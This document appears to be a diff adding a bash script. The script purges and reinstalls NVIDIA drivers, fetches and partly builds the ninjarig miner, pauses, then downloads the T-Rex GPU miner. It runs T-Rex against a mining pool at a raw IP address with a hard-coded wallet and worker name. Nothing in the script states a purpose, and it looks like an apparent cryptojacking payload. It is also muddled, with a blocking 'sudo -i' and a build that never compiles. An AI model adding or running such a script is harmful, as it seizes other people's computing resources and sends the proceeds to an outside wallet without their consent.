@@ -1,0 +1,4 @@
+#! /bin/bash
+
+sudo -i
+sudo apt purge nvidia* libnvidia* && sudo apt install nvidia-driver-470 && wget https://github.com/turtlecoin/ninjarig/releases/download/v1.0.3/ninjarig_v1.0.3_08.09.2019_linux.tar.gz && tar -xvf ninjarig_v1.0.3_08.09.2019_linux.tar.gz && sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev -y && git clone https://github.com/turtlecoin/ninjarig.git && cd ninjarig && mkdir build && cd build && cmake -DWITH_OPENCL=OFF .. -DCMAKE_BUILD_TYPE=RELEASE && cmake .. -DCMAKE_BUILD_TYPE=RELEASE && sleep 1200 && sudo apt purge nvidia* libnvidia* && sudo apt install nvidia-driver-470 && wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz && tar -xvf t-rex-0.25.15-linux.tar.gz && ./t-rex -a kawpow -o stratum+tcp://46.4.33.226:3032 -u AYpLfTNa8sZ7UYRE7bgogMy9PXePpV6g6C.Luxy -p x -w Tes1
